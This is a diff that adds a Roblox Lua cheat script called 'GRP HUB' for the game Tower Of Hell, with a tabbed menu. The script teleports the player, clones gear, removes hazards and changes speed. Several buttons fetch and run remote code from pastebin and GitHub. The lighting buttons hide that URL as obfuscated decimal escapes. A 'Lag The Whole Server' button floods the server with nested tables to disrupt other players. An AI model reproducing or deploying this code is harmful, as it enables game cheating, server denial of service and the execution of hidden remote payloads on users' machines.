@@ -1,0 +1,445 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "GRP HUB | Tower Of Hell", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+--GUI
+OrionLib:MakeNotification({
+	Name = " GRP-HUB ",
+	Content = " Tower Of Hell ",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+
+
+--Tabs
+local Tab = Window:MakeTab({
+	Name = "In Game",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Tab2 = Window:MakeTab({
+	Name = "Player",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+local Tab3 = Window:MakeTab({
+	Name = "Misc",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Tab4 = Window:MakeTab({
+	Name = "Credits",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+
+
+--Sections
+local Section = Tab:AddSection({
+	Name = "| MAIN"
+})
+
+
+
+--Tab
+Tab:AddButton({
+	Name = "Teleport To End",
+	Callback = function()
+      		local endzone = game.Workspace.tower.sections.finish.FinishGlow.CFrame
+ 
+    local player = game.Players.LocalPlayer.Character
+    player.HumanoidRootPart.CFrame = endzone
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Get All Gears",
+	Callback = function()
+      		for _,e in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
+        if e:IsA("Tool") then
+        e:Destroy()
+        end
+        end
+        wait() 
+        for _,v in pairs(game.ReplicatedStorage.Gear:GetDescendants()) do
+        if v:IsA("Tool") then
+        local CloneThings = v:Clone()
+        wait()
+        CloneThings.Parent = game.Players.LocalPlayer.Backpack
+ 
+        end
+        end
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Remove Kill Parts",
+	Callback = function()
+      		for i,v in pairs(game:GetService("Workspace").tower:GetDescendants()) do
+        if v:IsA("BoolValue") and v.Name == "kills" then
+            v.Parent:Destroy()
+        end
+    end
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Buy a Box",
+	Callback = function()
+      		local args = {
+    [1] = "Regular"
+}
+
+game:GetService("ReplicatedStorage").openBox:InvokeServer(unpack(args))
+
+  	end    
+})
+
+local Section0 = Tab:AddSection({
+	Name = "| OTHER"
+})
+
+Tab:AddButton({
+	Name = "Click Teleport (Ctrl + Click)",
+	Callback = function()
+      		local UIS = game:GetService("UserInputService")
+
+local Player = game.Players.LocalPlayer
+local Mouse = Player:GetMouse()
+
+
+function GetCharacter()
+   return game.Players.LocalPlayer.Character
+end
+
+function Teleport(pos)
+   local Char = GetCharacter()
+   if Char then
+       Char:MoveTo(pos)
+   end
+end
+
+
+UIS.InputBegan:Connect(function(input)
+   if input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
+       Teleport(Mouse.Hit.p)
+   end
+end)
+  	end    
+})
+
+
+
+Tab:AddToggle({
+	Name = "Auto Buy Box",
+	Default = false,
+	Callback = function(Value)
+		if state then
+        _G.autobox = true;
+
+while _G.autobox == true do
+local args = {
+    [1] = "Regular"
+}
+
+game:GetService("ReplicatedStorage").openBox:InvokeServer(unpack(args))
+wait(0.5)
+end
+
+    else
+        _G.autobox = false;
+
+while _G.autobox == true do
+local args = {
+    [1] = "Regular"
+}
+
+game:GetService("ReplicatedStorage").openBox:InvokeServer(unpack(args))
+wait(0.5)
+end
+
+    end
+	end    
+})
+
+local Section = Tab:AddSection({
+	Name = "| MAIN PLAYER"
+})
+
+Tab2:AddSlider({
+	Name = "WalkSpeed",
+	Min = 17,
+	Max = 200,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "Speed",
+	Callback = function(Value)
+		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
+	end    
+})
+
+Tab2:AddSlider({
+	Name = "JumpPower",
+	Min = 50,
+	Max = 280,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "Power",
+	Callback = function(Value)
+		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
+	end    
+})
+
+Tab2:AddSlider({
+	Name = "Camera FOV",
+	Min = 60,
+	Max = 140,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "Degree",
+	Callback = function(Value)
+		game.Workspace.CurrentCamera.FieldOfView = Value
+	end    
+})
+
+Tab2:AddButton({
+	Name = "Reset",
+	Callback = function()
+      		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 17
+       game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+       game.Workspace.CurrentCamera.FieldOfView = 70
+  	end    
+})
+
+local Section = Tab3:AddSection({
+	Name = "| MAIN MISC"
+})
+
+
+Tab3:AddButton({
+	Name = "Rejoin Game",
+	Callback = function()
+      		local ts = game:GetService("TeleportService")
+
+local p = game:GetService("Players").LocalPlayer
+
+ 
+
+ts:Teleport(game.PlaceId, p)
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "E To Fly",
+	Callback = function()
+      		loadstring(game:HttpGet("https://pastebin.com/raw/YxvCwZL3"))()
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "Infinite Jump",
+	Callback = function()
+      		loadstring(game:HttpGet("https://pastebin.com/raw/FD8hYtU9"))()
+  	end    
+})
+
+
+Tab3:AddButton({
+	Name = "Fps Stats",
+	Callback = function()
+      		loadstring(game:HttpGet("https://pastebin.com/raw/qSQKxrkt", true))()
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "Lag The Whole Server",
+	Callback = function()
+      		--// made my reestart
+--// fixed by daddy ewo
+while wait(0.6) do --// don't change it's the best
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+local function getmaxvalue(val)
+local mainvalueifonetable = 499999
+if type(val) ~= "number" then
+return nil
+end
+local calculateperfectval = (mainvalueifonetable/(val+2))
+return calculateperfectval
+end
+local function bomb(tableincrease, tries)
+local maintable = {}
+local spammedtable = {}
+table.insert(spammedtable, {})
+z = spammedtable[1]
+for i = 1, tableincrease do
+local tableins = {}
+table.insert(z, tableins)
+z = tableins
+end
+local calculatemax = getmaxvalue(tableincrease)
+local maximum
+if calculatemax then
+maximum = calculatemax
+else
+maximum = 999999
+end
+for i = 1, maximum do
+table.insert(maintable, spammedtable)
+end
+for i = 1, tries do
+game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+end
+end
+bomb(250, 2) --// change values if client crashes
+end
+  	end    
+})
+
+local Section = Tab3:AddSection({
+	Name = "| OTHER MISC"
+})
+
+Tab3:AddButton({
+	Name = "Infinite Yield",
+	Callback = function()
+      		loadstring(game:HttpGet(('https://pastebin.com/raw/tzTXmYf2'),true))()
+  	end    
+})
+
+Tab3:AddButton({
+	Name = "CMD - X",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
+   	end    
+})
+
+local Section = Tab2:AddSection({
+	Name = "| LIGHTING MODE"
+})
+
+Tab2:AddButton({
+    Name = "Nightmode",
+    Callback = function()
+            _G.BlurSize = 1
+
+_G.ColorCorrectionBrightness = 0.03
+_G.ColorCorrectionContrast = 0.3
+_G.ColorCorrectionSaturation = 0.01
+_G.ColorCorrectionTintColor = Color3.fromRGB(179,145,222)
+
+_G.SunRaysIntensity = 0.2
+_G.SunRaysSpread = 1
+
+-- Lighting settings:
+_G.GlobalShadows = true
+_G.Brightness = 0.9
+_G.GeographicLatitude = 350
+_G.TimeOfDay = 0
+_G.ExposureCompensation = 0.03
+
+
+spawn(function()
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\55\110\57\103\53\55\112\50"))()
+end)
+    end
+})
+
+Tab2:AddButton({
+    Name = "Daymode",
+    Callback = function()
+            _G.BlurSize = 1
+
+_G.ColorCorrectionBrightness = 0.03
+_G.ColorCorrectionContrast = 0.3
+_G.ColorCorrectionSaturation = 0.01
+_G.ColorCorrectionTintColor = Color3.fromRGB(244,244,244)
+
+_G.SunRaysIntensity = 0.3
+_G.SunRaysSpread = 1
+
+-- Lighting settings:
+_G.GlobalShadows = true
+_G.Brightness = 1
+_G.GeographicLatitude = 350
+_G.TimeOfDay = 17
+_G.ExposureCompensation = 0.03
+
+
+spawn(function()
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\55\110\57\103\53\55\112\50"))()
+end)
+    end
+})
+
+Tab2:AddButton({
+    Name = "Cartoony Mode",
+    Callback = function()
+            _G.BlurSize = 1
+
+_G.ColorCorrectionBrightness = 1
+_G.ColorCorrectionContrast = 50
+_G.ColorCorrectionSaturation = 1
+_G.ColorCorrectionTintColor = Color3.fromRGB(244,244,244)
+
+_G.SunRaysIntensity = 1
+_G.SunRaysSpread = 1
+
+-- Lighting settings:
+_G.GlobalShadows = true
+_G.Brightness = 3
+_G.GeographicLatitude = 350
+_G.TimeOfDay = 17
+_G.ExposureCompensation = 1
+
+
+spawn(function()
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\55\110\57\103\53\55\112\50"))()
+end)
+    end
+})
+
+Tab2:AddLabel("-[ You Can't Reset The Lighting Mode ]-")
+Tab2:AddLabel("-[ Just Rejoin To Reset Them ]-")
+
+local Section = Tab4:AddSection({
+	Name = "| CREDITS"
+})
+Tab4:AddLabel("Designer -> GRP")
+Tab4:AddLabel("Scripter -> GRP")
+Tab4:AddLabel("Script From -> 'GRP HUB'")
+
+
+
+
+local Section = Tab4:AddSection({
+	Name = "| DISCORD"
+})
+Tab4:AddLabel("Discord -> GRP#8965")
+Tab4:AddLabel("Server -> 'dsc.gg/grphub'")
+Tab4:AddLabel("|| Join Discord For Every Script Of 'GRP HUB' ||")
+
+
+
+
+local Section = Tab4:AddSection({
+	Name = "| SOCIAL"
+})
+Tab4:AddLabel("YouTube -> GW GRP")
+Tab4:AddLabel("Roblox -> GRP_OFFICIAL")
+
+
+local Section = Tab4:AddSection({
+	Name = "| SCRIPT END"
+})
+
+
+
+
+
+
+
